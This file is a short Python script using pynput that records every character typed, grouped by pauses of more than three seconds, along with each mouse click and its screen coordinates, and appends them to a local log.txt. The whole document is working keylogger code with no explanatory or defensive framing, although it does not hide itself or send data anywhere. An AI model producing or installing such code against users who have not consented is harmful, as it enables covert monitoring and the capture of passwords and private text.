from pynput import keyboard
from pynput import mouse
import time

last_key_press_time = 0
keys_pressed_within_3_sec = []

def on_press(key):
    global last_key_press_time, keys_pressed_within_3_sec
    try:
        # Calculate the time elapsed since the last key press event
        time_elapsed = time.time() - last_key_press_time
        # If the time elapsed is greater than 3 seconds, write the previous keys on a new line
        if time_elapsed > 3 and len(keys_pressed_within_3_sec) > 0:
            with open('log.txt', 'a') as f:
                f.write('Keys pressed: {0}\n'.format(' '.join(keys_pressed_within_3_sec)))
            keys_pressed_within_3_sec = []
        # Add the current key to the list of keys pressed within 3 seconds
        keys_pressed_within_3_sec.append(key.char)
        # Update the last key press time
        last_key_press_time = time.time()
    except AttributeError:
        pass

def on_click(x, y, button, pressed):
    with open('log.txt', 'a') as f:
        f.write('Mouse clicked: {0} at ({1}, {2})\n'.format(button, x, y))

with keyboard.Listener(on_press=on_press) as listener:
    with mouse.Listener(on_click=on_click) as listener:
        listener.join()
